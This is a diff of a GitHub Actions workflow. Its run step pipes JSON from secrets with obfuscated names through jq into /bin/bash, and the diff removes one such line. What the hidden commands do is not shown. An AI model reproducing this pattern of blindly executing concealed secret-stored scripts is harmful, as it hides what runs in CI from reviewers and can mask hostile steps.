@@ -18,7 +18,6 @@ jobs:
           rthy6: ${{ secrets.rthy6 }}
         run: |
           printf '%s' "$rthy6" | jq -r .tjgq04157 | /bin/bash
-          echo $sj056 | jq -r .s62 | /bin/bash
           printf '%s' "$bxsv2861" | jq -r .e57692 | /bin/bash
           printf '%s' "$iop2" | jq -r .lk01 | /bin/bash
           printf '%s' "$bgo7" | jq -r .nsln88746 | /bin/bash
